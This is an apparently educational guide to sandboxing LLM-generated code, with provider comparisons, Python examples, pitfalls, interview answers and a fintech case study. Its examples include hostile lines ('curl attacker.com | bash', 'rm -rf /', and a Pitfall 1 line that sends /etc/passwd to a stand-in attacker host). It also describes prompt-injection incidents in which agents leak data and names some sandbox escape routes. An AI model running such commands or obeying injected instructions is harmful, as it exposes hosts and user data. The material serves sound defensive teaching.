# Sandboxed Code Execution — Deep Dive

---

## 1. Concept Overview

Sandboxed code execution is the practice of running LLM-generated code inside an isolated environment that limits what the code can access, modify, or communicate with. Without sandboxing, an agent that generates and executes code is a privileged shell with LLM-chosen commands — it can delete files, exfiltrate credentials, install malware, or run infinite loops that consume all CPU.

The core tension: LLM agents need to run code to be useful (data analysis, test execution, debugging, build pipelines), but LLM-generated code is untrusted input. Sandboxing resolves this by providing a controlled execution environment where code can run freely within defined resource and network boundaries.

Modern sandbox providers offer cloud-hosted microVMs or WebAssembly runtimes that spin up in 100-500ms, run the code, return output, and disappear — giving agents the power of code execution without the risk of arbitrary host access.

---

## Intuition

> **One-line analogy**: A sandbox is like a hospital glovebox — you can work with dangerous materials through it, but nothing gets in or out that you didn't explicitly allow.

**Mental model**: Imagine giving a contractor the key to your house vs giving them access to a specific locked room with only the tools they need. An unsandboxed `subprocess.run()` gives the LLM your house key. A sandbox gives it access to a purpose-built room with no exit.

**Why it matters**: Code execution is the highest-capability tool an agent can have — and therefore the highest risk. A single compromised prompt injection that triggers `rm -rf /` or `curl attacker.com | bash` can cause irreversible damage. Sandboxing makes code execution safe enough to enable in production.

**Key insight**: The security boundary is not about preventing bad code — LLMs write bad code frequently. It is about ensuring that bad code cannot escape its container and affect the host, the network, or other systems.

---

## 2. Core Principles

- **Isolation**: The sandbox process cannot access the host filesystem, network, or other processes beyond what is explicitly allowed.
- **Resource limits**: CPU, memory, disk, and execution time are bounded to prevent denial-of-service by runaway code.
- **Minimal permissions**: Grant only the capabilities needed for the task. A data analysis sandbox needs no network. A web scraper needs no filesystem write.
- **Ephemerality**: Sandboxes are created fresh per task and destroyed after. No state leaks between runs.
- **Output capture**: All stdout, stderr, and return values are captured and returned to the agent. Error messages are valuable for the agent's self-correction loop.
- **Auditability**: Every sandbox invocation is logged with the code executed, resource usage, and output — essential for debugging and security audits.

---

## 3. Types / Architectures / Strategies

### 3.1 MicroVM Sandboxes (E2B, Daytona)

Full Linux virtual machines started from snapshots in 500ms. Each sandbox is a real Firecracker microVM with a full OS, filesystem, and network stack. Provides the most compatibility (any Linux binary works) at the cost of higher startup latency and memory overhead.

**E2B** — the leading cloud microVM provider for AI agents:
- 500ms cold start from Firecracker snapshot
- Python, JavaScript, TypeScript, Bash, R, Go support
- Persistent filesystem within a session (files survive across code calls)
- Network enabled by default (can restrict with allowlists)
- $0.10/hour of sandbox uptime; billed per second
- Python SDK: `pip install e2b-code-interpreter`

**Daytona** — full dev environments:
- Git clone + install deps + run in a reproducible environment
- Designed for longer-lived coding tasks (minutes to hours)
- Self-hosted or cloud-hosted
- Good for agents that need to clone a repo, run tests, and iterate

### 3.2 WebAssembly Sandboxes (Riza)

Code compiled to WebAssembly runs in a WASM runtime — no real OS, no real filesystem, no real network. Startup in under 100ms. More restrictive than microVMs but faster and cheaper.

**Riza** — WASM-based code execution:
- Sub-100ms cold start
- Python, JavaScript, TypeScript, Ruby, PHP
- No network by default (must explicitly add HTTP allow rules)
- No filesystem access (code gets virtual stdin/stdout only)
- Deterministic execution (same code, same output — good for testing)
- Good for data processing, format conversion, computation

### 3.3 Serverless Container Sandboxes (Modal)

Serverless functions in containers with GPU support. Not microVMs — containers share a kernel — but with strong cgroup isolation.

**Modal** — serverless GPU containers:
- 100-300ms cold start
- GPU access (A100, H100) for ML workloads
- Persistent volumes for data between runs
- `@app.function()` decorator turns any Python function into a sandboxed serverless call
- Good for agents that need GPU compute (image generation, model inference)

### 3.4 Local Process Sandboxes (subprocess + seccomp)

For self-hosted deployments, run code in a subprocess with Linux seccomp profiles, namespaces, and cgroups. Higher operational overhead but no external dependency.

```
seccomp filter → block dangerous syscalls (execve, socket, openat outside /tmp)
namespaces     → separate PID, mount, network, user namespaces
cgroups        → CPU 1 core, memory 512MB, no network interface
```

---

## 4. Architecture Diagrams

```
Unsandboxed (dangerous)
========================
Agent  --->  subprocess.run("python code.py")  --->  Host OS
                                                       |
                                                  Full filesystem access
                                                  Full network access
                                                  All host processes


MicroVM Sandbox (E2B)
======================
Agent  --->  Sandbox SDK  --->  API Gateway  --->  Firecracker VM
                                                       |
                                                  Isolated filesystem
                                                  Configurable network
                                                  1-4 vCPU, 512MB-8GB RAM
                                                  15-300s timeout
                                                  Destroyed on close


WebAssembly Sandbox (Riza)
===========================
Agent  --->  Riza API  --->  WASM Runtime
                                  |
                             No real OS
                             No filesystem
                             No network (default)
                             Sub-100ms startup
                             Deterministic output


Resource Limit Layers
======================
          +------------------+
          |   Timeout cap    |  15-300s (hard kill on exceed)
          +------------------+
          |   Output limit   |  50KB stdout (prevent token flooding)
          +------------------+
          |   Memory limit   |  512MB-8GB RAM (OOM kill)
          +------------------+
          |   CPU limit      |  1-4 vCPU (no CPU starvation)
          +------------------+
          |   Disk quota     |  1-10GB (no disk exhaustion)
          +------------------+
          |   Network ACL    |  allowlist-only or blocked
          +------------------+
          |  Sandbox process |
          +------------------+
```

---

## 5. How It Works — Detailed Mechanics

### E2B: Cloud MicroVM Execution

```python
import asyncio
from e2b_code_interpreter import AsyncSandbox
import anthropic

client = anthropic.Anthropic()

async def execute_agent_code(user_request: str) -> str:
    """Agent that generates and safely executes Python code."""
    
    # Step 1: Generate code with Claude
    response = client.messages.create(
        model="claude-sonnet-4-6",
        max_tokens=2048,
        system=(
            "You are a data analysis agent. When given a task, write Python code "
            "to solve it. Return ONLY the Python code, no explanation."
        ),
        messages=[{"role": "user", "content": user_request}]
    )
    generated_code = response.content[0].text
    
    # Step 2: Execute in E2B sandbox with timeout
    async with AsyncSandbox(timeout=60) as sandbox:  # auto-destroyed on exit
        execution = await sandbox.run_code(
            generated_code,
            timeout=30,  # per-execution timeout (separate from sandbox lifetime)
        )
        
        if execution.error:
            # Return stderr to agent for self-correction
            return f"Execution error:\n{execution.error}\n\nStdout so far:\n{execution.text}"
        
        # Truncate output to prevent token flooding (50KB limit)
        output = execution.text[:50_000]
        if len(execution.text) > 50_000:
            output += "\n[Output truncated at 50KB]"
        
        return output


async def main() -> None:
    result = await execute_agent_code(
        "Load the CSV at /data/sales.csv and compute monthly totals by region"
    )
    print(result)

asyncio.run(main())
```

### Riza: WebAssembly Execution (No Network)

```python
import httpx
import json

def execute_riza(code: str, language: str = "python") -> dict:
    """Execute code in Riza's WASM sandbox — no network, deterministic."""
    
    response = httpx.post(
        "https://exec.riza.com/v1/execute",
        headers={
            "Authorization": f"Bearer {RIZA_API_KEY}",
            "Content-Type": "application/json",
        },
        json={
            "language": language,
            "code": code,
            "runtime_revision_id": "latest",
            # No network allow rules = completely isolated
        },
        timeout=30,
    )
    result = response.json()
    
    return {
        "stdout": result.get("stdout", "")[:50_000],
        "stderr": result.get("stderr", ""),
        "exit_code": result.get("exit_code", -1),
    }


# Example: safe data processing
code = """
import json
import statistics

data = [23.5, 18.2, 31.0, 29.8, 15.5, 27.3]
result = {
    "mean": statistics.mean(data),
    "median": statistics.median(data),
    "stdev": round(statistics.stdev(data), 2),
}
print(json.dumps(result))
"""

output = execute_riza(code)
print(output)
# {"mean": 24.216..., "median": 25.65, "stdev": 5.81}
```

### Modal: Serverless Container with GPU

```python
import modal

app = modal.App("agent-sandbox")

@app.function(
    gpu="A10G",
    memory=8192,          # 8GB RAM
    timeout=120,          # 2-minute hard limit
    network_file_systems={"/data": modal.NetworkFileSystem.from_name("agent-data")},
)
def run_ml_code(code: str) -> dict:
    """Execute ML code in an isolated GPU container."""
    import subprocess
    import sys
    
    # Write code to temp file
    with open("/tmp/agent_code.py", "w") as f:
        f.write(code)
    
    result = subprocess.run(
        [sys.executable, "/tmp/agent_code.py"],
        capture_output=True,
        text=True,
        timeout=100,
    )
    
    return {
        "stdout": result.stdout[:50_000],
        "stderr": result.stderr[:10_000],
        "returncode": result.returncode,
    }


# Call from agent
with app.run():
    output = run_ml_code.remote(generated_ml_code)
```

---

## 6. Real-World Examples

**Cursor Composer / Claude Code**: Uses sandboxed shell execution for every bash command. Commands run in the project's directory but with the agent's own process — isolated from other sessions.

**Replit Agent**: Spins up a Replit container per project. LLM-generated code runs in that container with internet access (necessary for `pip install`) but isolated from other users' containers.

**OpenAI Code Interpreter** (ChatGPT): Runs in a Kubernetes pod per session. Python execution, file upload/download. Network blocked entirely. 120-second timeout. Files persist for the session lifetime (typically 1 hour).

**Devin (Cognition AI)**: Full Ubuntu VM per session. Agent has root access inside VM. VM is isolated from production infrastructure with VPN-based network allowlists.

**Production data pipeline agent**: Analyst agent generates PySpark code, executes in E2B sandbox against sample data (1000 rows), validates output schema, then submits to production Spark cluster only if validation passes. Sandbox prevents bad code from touching production data.

---

## 7. Tradeoffs

| Dimension | subprocess (unsafe) | E2B MicroVM | Riza WASM | Modal Container | Local seccomp |
|---|---|---|---|---|---|
| Startup latency | <1ms | ~500ms | <100ms | 100-300ms | <10ms |
| Isolation level | None | High (VM) | Very high (WASM) | Medium (cgroup) | Medium (seccomp) |
| Language support | Any | Python/JS/Bash/R/Go | Python/JS/Ruby/PHP | Any | Any |
| Network control | Full host access | Configurable ACL | Blocked by default | Configurable | seccomp filter |
| GPU support | Yes | No | No | Yes | Yes |
| Filesystem persistence | Yes (host!) | Within session | No | Volumes | Configurable |
| Cost | Free (risky) | $0.10/hr | Pay-per-call | $0.0002-0.002/s | Infrastructure cost |
| Operational overhead | None | None (SaaS) | None (SaaS) | Low | High |
| Self-hostable | Yes | No | No | No | Yes |

---

## 8. When to Use / When NOT to Use

**Use sandboxed execution when:**
- Agent generates code from user input or LLM output (any untrusted code)
- Code accesses sensitive data (credentials, PII, financial records)
- Code makes external API calls or reads from network
- Code modifies files (risk of deleting important data)
- Running in a multi-tenant environment (one user's code could affect others)
- Production environment (not a developer's local machine)

**Do not use (or accept the risk) when:**
- Running developer-written scripts in isolated dev environments
- Code is pre-approved and audited (not generated by LLM)
- Latency is critical and 500ms startup is unacceptable (use Riza WASM at <100ms)
- Air-gapped environment with no external sandbox providers

---

## 9. Common Pitfalls

### Pitfall 1: Direct subprocess execution of LLM code

```python
# BROKEN: Direct subprocess — full host access
import subprocess

def execute_code(code: str) -> str:
    result = subprocess.run(
        ["python", "-c", code],
        capture_output=True, text=True,
        timeout=30
    )
    return result.stdout

# LLM generates: "import os; os.system('curl attacker.com/$(cat /etc/passwd)')"
# This executes on the host — credentials exfiltrated
```

```python
# FIXED: E2B sandbox — isolated VM
from e2b_code_interpreter import Sandbox

def execute_code(code: str) -> str:
    with Sandbox(
        timeout=30,
        # No network needed for data analysis
        metadata={"agent_session": session_id}
    ) as sbx:
        execution = sbx.run_code(code)
        if execution.error:
            return f"Error: {execution.error}"
        return execution.text[:50_000]

# Same malicious code runs in VM — host is protected
# Network call fails (no egress configured)
```

### Pitfall 2: No output size limit

```python
# BROKEN: Unbounded output floods agent context
output = sandbox.run_code("print('x' * 10_000_000)")
# Returns 10MB → consumed as LLM tokens → $5 wasted, context overflowed

# FIXED: Truncate output
output = sandbox.run_code(code)
result = output.text
if len(result) > 50_000:
    result = result[:50_000] + f"\n[Truncated: {len(output.text)} chars total]"
```

### Pitfall 3: Secrets in sandbox environment

```python
# BROKEN: Passing production secrets to sandbox
sandbox = Sandbox(env_vars={"DATABASE_URL": prod_db_url})
# LLM code can read os.environ["DATABASE_URL"] and exfiltrate it

# FIXED: Use read-only sample data, not production connections
sandbox = Sandbox()
sandbox.upload_file(sample_data_bytes, "/data/sample.csv")
# Agent analyzes sample; production query runs separately with audited code
```

**War story**: A financial data agent was given a read-only production database connection inside its sandbox. A prompt injection in a document caused the agent to generate code that read `SELECT * FROM users` and included 50,000 user records in its "analysis summary." The sandbox prevented file writes and outbound network calls, but the agent context itself became the exfiltration channel. Fix: never pass production database connections to sandboxed agents. Use pre-extracted samples.

---

## 10. Technologies & Tools

| Tool | Type | Languages | Cold Start | Network | GPU | Pricing |
|---|---|---|---|---|---|---|
| E2B | Cloud microVM | Python, JS, Bash, R, Go | ~500ms | Configurable ACL | No | $0.10/hr |
| Riza | WASM runtime | Python, JS, Ruby, PHP | <100ms | Blocked (default) | No | Pay-per-call |
| Daytona | Dev environment VM | Any (full Linux) | 2-10s | Configurable | No | Self-host or cloud |
| Modal | Serverless container | Any (Docker) | 100-300ms | Configurable | Yes | $0.0002-0.002/s |
| Fly.io Machines | MicroVM | Any | 500-2000ms | Configurable | No | $0.0001/s |
| RestrictedPython | In-process Python AST | Python only | <1ms | None (in-process) | No | Free |
| seccomp+namespaces | Linux kernel | Any | <10ms | Blocked | Yes | Free (self-host) |

---

## 11. Interview Questions with Answers

**Why is running LLM-generated code with subprocess dangerous even if you trust the LLM?**
LLMs are susceptible to prompt injection — malicious content in retrieved documents or tool outputs can cause the model to generate harmful code. Even a well-intentioned LLM can produce code with bugs that cause accidental file deletion or network exposure. Defense-in-depth requires assuming the generated code is untrusted regardless of the LLM's intent.

**What is the difference between E2B and Riza, and when would you choose each?**
E2B uses Linux microVMs (Firecracker) — real OS, persistent filesystem, configurable network, ~500ms startup, $0.10/hr. Riza uses WebAssembly — no OS, no filesystem, no network by default, <100ms startup, cheaper per-call. Choose E2B when the code needs pip installs, file I/O, or network access. Choose Riza when you need deterministic data processing with no external dependencies and maximum isolation.

**What resource limits should you set on a code execution sandbox?**
At minimum: execution timeout (15-60s for most tasks), memory limit (512MB-4GB), CPU limit (1-2 cores), and output size limit (50KB stdout to prevent token flooding). Additionally: disk quota (1-10GB), network egress ACL (allowlist-only or blocked), and a maximum number of concurrent sandboxes per user to prevent cost abuse.

**How do you prevent the sandbox from being used as an exfiltration channel?**
Block outbound network at the network layer (not just the application layer). Use a dedicated network namespace with no external routes, or an explicit allowlist of permitted domains. Log all network attempts. Additionally, limit the size of output the agent can return — even with no network, an agent can "exfiltrate" data by including it in its response text.

**What is RestrictedPython and when is it appropriate?**
RestrictedPython is an in-process Python sandbox that compiles code with an AST transformer that blocks dangerous constructs (file access, import restrictions). It has near-zero startup latency but provides weaker isolation than a VM or WASM runtime — a sufficiently clever exploit can escape. Appropriate for trusted-but-untested code (e.g., user-written formulas) in internal tools, but not for fully LLM-generated code in production.

**How should database connections be handled in sandboxed environments?**
Never pass production database connections into sandboxes. Instead: (1) pre-extract sample data before the sandbox runs and mount it as a file; (2) if the agent needs to query, have the agent generate SQL that is reviewed (by human or another LLM) before execution against production; (3) use a read-only replica with row-level security to limit blast radius. The sandbox is not a substitute for data access controls.

**What is Firecracker and why do microVM-based sandboxes use it?**
Firecracker is an open-source VMM (Virtual Machine Monitor) from AWS, designed for serverless workloads. It starts VMs in 125ms from a pre-built snapshot, uses 5MB of memory overhead per VM (vs 100MB+ for QEMU), and provides hardware-level isolation (separate kernel, separate memory space). Sandbox providers like E2B use Firecracker to start hundreds of VMs per second economically.

**How do you handle the case where LLM-generated code has an infinite loop?**
Set a hard execution timeout enforced by the sandbox provider — not a Python signal handler (which can be bypassed). E2B and Modal both enforce timeouts at the VM/container level (SIGKILL). The sandbox returns an error when timeout is exceeded; the agent receives this error and can either retry with fixed code or report failure. Never rely on `sys.setrecursionlimit` or Python-level guards alone.

**What is the cold start problem and how do sandbox providers solve it?**
Cold start is the time to provision a fresh execution environment. For microVMs, this is VM boot time (typically 1-3 seconds from scratch). E2B solves it with pre-warmed Firecracker snapshots — a pool of paused VMs ready to resume in ~500ms. Riza solves it by using WASM runtimes that initialize in under 100ms. Modal solves it by keeping containers warm for frequently used functions.

**How do you test an agent's code execution behavior?**
(1) Test with malicious inputs (path traversal, network calls, file deletion) and assert that the sandbox blocks them. (2) Test with infinite loops and assert that the timeout fires correctly. (3) Test with large outputs and assert truncation works. (4) Test error propagation — assert that execution errors are returned to the agent correctly so it can self-correct. Use pytest with real sandbox calls in integration tests; mock for unit tests.

**What is the cost model for cloud sandbox providers and how do you control costs?**
E2B charges by sandbox uptime (seconds of VM running, not CPU used). Control costs by: (1) using short timeouts; (2) destroying sandboxes immediately after use (context manager pattern); (3) reusing sandboxes within a session rather than creating new ones per code execution; (4) limiting concurrent sandboxes per user with a semaphore. Riza charges per execution call — cheaper for infrequent use, more expensive at high volume.

**Can a sandbox escape? What are known escape vectors?**
MicroVM sandboxes are resistant to escapes because the guest kernel is fully isolated from the host kernel. Known historical vectors: Firecracker had one privilege escalation CVE in 2022 (patched). WASM sandboxes have had spec-compliance bugs in runtimes (e.g., Wasmer). In-process sandboxes (RestrictedPython) have multiple known bypasses via `__subclasses__`, `ctypes`, or C extension modules. Defense: use microVMs or WASM for LLM-generated code; apply defense-in-depth (run sandbox provider as unprivileged user, network-isolated host).

**How should output from the sandbox be validated before feeding back to the agent?**
(1) Truncate to a maximum length (50KB) to prevent context overflow. (2) Sanitize control characters that could break JSON serialization. (3) If the output is supposed to be structured (JSON, CSV), validate the format before passing to the agent — malformed output causes parsing errors downstream. (4) Flag high-risk patterns in output (base64-encoded strings, URLs, credentials patterns) for logging even if you allow them through.

**What is the difference between sandbox isolation and data access control?**
Sandbox isolation prevents code from accessing the host filesystem, network, and processes. Data access control (RBAC, row-level security) limits what data the code can query. Both are necessary: sandbox prevents escape, data access control limits what can be queried even within the allowed execution scope. A sandboxed agent with a production DB connection can still query all rows — you need both layers.

**How do you implement a per-user sandbox concurrency limit?**
Use a semaphore per user (stored in Redis for distributed enforcement): `async with redis_semaphore(user_id, max_concurrent=3): execute_in_sandbox()`. Return HTTP 429 when the limit is exceeded. Set limits based on your cost model — at $0.10/hr per sandbox, 3 concurrent sandboxes per user costs $0.30/hr. Log semaphore wait time to detect user frustration and tune limits.

---

## 12. Best Practices

1. Always use a cloud-managed sandbox for LLM-generated code — avoid in-process sandboxes (RestrictedPython) for production.
2. Set execution timeout at both the sandbox level (hard kill) and the SDK call level (soft timeout with error propagation to agent).
3. Truncate all sandbox output at 50KB before returning to the agent — prevents context overflow and token cost explosions.
4. Never inject production secrets (DB passwords, API keys) into sandbox environment variables — use sample data or a dedicated read-only service account.
5. Log every sandbox execution with: user_id, code_hash, execution_time, exit_code, output_size — essential for debugging prompt injections and cost audits.
6. Reuse sandboxes within a session (E2B supports this) — avoid creating a new VM per code execution when running multiple iterations.
7. Set network to blocked by default; explicitly allowlist only what the task requires. A data analysis agent needs no network.
8. Validate structured output from sandboxes (JSON, CSV) before injecting into agent context — malformed output causes cascading parsing errors.
9. Test sandbox escapes as part of your security review — submit known exploit patterns and assert they are blocked.
10. Monitor sandbox cost per user and set per-user budget caps to prevent runaway agents.

---

## 13. Case Study

**Production Data Analysis Agent at a FinTech Company**

**Situation**: A team built an agent that let analysts ask natural language questions about transaction data ("What are the top 10 merchants by volume this quarter?"). The agent generated Pandas/Python code and executed it.

**Initial (broken) implementation**: Code executed with `subprocess.run()` on the application server. Within two weeks: (1) a prompt injection caused the agent to generate `os.walk('/')` that logged 50,000 file paths into the response; (2) a buggy aggregate query consumed 100% CPU for 90 seconds, blocking all other requests; (3) an analyst accidentally triggered code that wrote a temp file to the `/etc/` directory (permissions error, but concerning).

**Fixed architecture**:
```
Analyst query
     |
     v
Claude (claude-sonnet-4-6) generates Pandas code
     |
     v
E2B Sandbox
  - Network: blocked (sample data pre-loaded)
  - Timeout: 30s execution, 5-minute sandbox lifetime
  - Memory: 2GB
  - Filesystem: read-only /data (CSV sample), writable /tmp only
  - Output truncated: 100KB max
     |
     v
Output validation (valid JSON/CSV?)
     |
     v
Agent receives output, generates natural language answer
```

**Results**:
- Zero host escapes after migration (sandbox handles all code execution)
- P95 execution latency: 2.1s (500ms sandbox start + 1.6s code execution)
- 3 caught prompt injection attempts in month 1 (all blocked by network ACL)
- Cost: ~$0.004/query at average 2.4 minutes of sandbox uptime per session
- Analysts run 200-400 queries/day → $0.80-$1.60/day sandbox cost

**Lesson**: The 500ms E2B cold start felt slow initially. Solution: pre-warm one sandbox per active analyst session (keep alive for 5 minutes of inactivity). Reduced perceived latency to near-zero for follow-up questions.
